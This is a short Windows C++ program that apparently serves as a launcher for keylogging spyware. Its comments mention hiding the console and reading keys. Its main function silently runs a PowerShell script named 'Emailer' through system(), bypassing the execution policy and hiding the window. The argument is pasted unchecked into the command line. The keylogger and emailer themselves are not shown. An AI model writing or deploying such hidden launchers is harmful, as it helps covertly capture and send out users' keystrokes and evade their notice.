#include <iostream>
#include <windows.h>  //For hiding/show console
#include <winuser.h>  //For reading keys
#include <ctime>      //For gettime function
#include <fstream>    //For file handling   
#include <string>     //Manipulating strings
#include <Lmcons.h>
#include <dir.h>
#include <sstream>
#include<conio.h>
#include<stdio.h>   //Used to get user name.
using namespace std;
string location;
void getlocation (void)  //Gets the location from where the file is placed.
   {
		char tuh[_MAX_PATH];
char *abc;
abc=getcwd(tuh,sizeof(tuh));
location=abc;
   }
main(int argc, char *argv[])
{
	 getlocation();
	 string command =("powershell.exe -executionpolicy bypass -windowstyle hidden -noninteractive -nologo -file \""+location+"\\Emailer"+argv[1]+".ps1\"");
 	 system(command.c_str());
}
